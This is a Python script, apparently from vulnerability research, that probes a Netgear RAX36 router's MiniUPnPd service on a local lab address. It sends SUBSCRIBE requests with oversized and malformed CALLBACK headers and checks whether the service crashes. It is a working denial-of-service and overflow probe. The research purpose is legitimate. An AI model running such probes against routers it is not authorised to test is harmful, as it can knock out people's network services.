#!/usr/bin/env python3
"""Bounded RAX30-derived eventing probes for isolated RAX36 MiniUPnPd."""

from __future__ import annotations

import socket
import time


HOST = "192.168.1.1"
PORT = 56688


def exchange(payload: bytes, timeout: float = 2.0) -> bytes:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
        client.settimeout(timeout)
        client.bind(("192.168.1.2", 0))
        client.connect((HOST, PORT))
        client.sendall(payload)
        client.shutdown(socket.SHUT_WR)
        client.settimeout(timeout)
        output = bytearray()
        try:
            while len(output) < 65536:
                chunk = client.recv(4096)
                if not chunk:
                    break
                output.extend(chunk)
        except (TimeoutError, socket.timeout):
            pass
        return bytes(output)


def status(payload: bytes) -> str:
    return payload.splitlines()[0].decode("iso-8859-1", "replace") if payload else "no-response"


def healthy() -> bool:
    try:
        response = exchange(
            b"GET /rootDesc.xml HTTP/1.1\r\n"
            b"Host: 192.168.1.1:56688\r\nConnection: close\r\n\r\n"
        )
        return response.startswith(b"HTTP/1.1 200")
    except OSError:
        return False


def subscribe(callback: bytes) -> bytes:
    return (
        b"SUBSCRIBE /evt/L3F HTTP/1.1\r\n"
        b"Host: 192.168.1.1:56688\r\n"
        b"CALLBACK: <" + callback + b">\r\n"
        b"NT: upnp:event\r\n"
        b"TIMEOUT: Second-1800\r\n"
        b"Content-Length: 0\r\n"
        b"Connection: close\r\n\r\n"
    )


def main() -> int:
    cases = [
        ("control", b"http://192.168.1.2:9/event"),
        (
            "rax30-73-byte-callback",
            b"http://192.168.1.2/FRIDAY_RAX36_PROBE_7b6f2a" + b"A" * 32,
        ),
        ("missing-scheme", b"A" * 73),
        ("long-callback", b"http://192.168.1.2/" + b"A" * 8192),
    ]
    if not healthy():
        print("baseline_failed")
        return 2
    for name, callback in cases:
        try:
            response = exchange(subscribe(callback))
            result = status(response)
        except OSError as error:
            result = f"socket-error:{error}"
        time.sleep(0.25)
        alive = healthy()
        print(f"{name} callback_bytes={len(callback)} status={result} alive={alive}")
        if not alive:
            print(f"crash_candidate={name}")
            return 1
    print("result=no-observable-eventing-dos")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
